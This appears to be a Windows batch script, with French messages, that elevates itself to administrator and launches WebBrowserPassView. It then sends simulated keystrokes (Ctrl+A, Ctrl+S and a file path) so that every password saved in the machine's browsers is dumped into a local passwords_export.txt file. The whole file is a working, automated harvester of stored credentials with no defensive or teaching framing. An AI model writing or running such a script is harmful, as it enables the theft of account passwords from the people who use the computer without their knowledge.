@echo off

rem Elevation en administrateur
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -Command "Start-Process '%~f0' -Verb RunAs"
  exit /b
)

set "WBPV=%~dp0WebBrowserPassView.exe"
set "OUTPUT=%~dp0passwords_export.txt"

if exist "%WBPV%" (
  echo Lancement de WebBrowserPassView...
  start "" "%WBPV%"
  
  echo Attente du chargement...
  timeout /t 4 /nobreak >nul
  
  echo Envoi de Ctrl+A...
  powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^a')"
  
  timeout /t 1 /nobreak >nul
  
  echo Envoi de Ctrl+S...
  powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('^s')"
  
  timeout /t 2 /nobreak >nul
  
  echo Envoi du chemin de sauvegarde...
  powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')"
  
  echo Termine. Verifiez: %OUTPUT%
) else (
  echo WebBrowserPassView.exe non trouve.
)

pause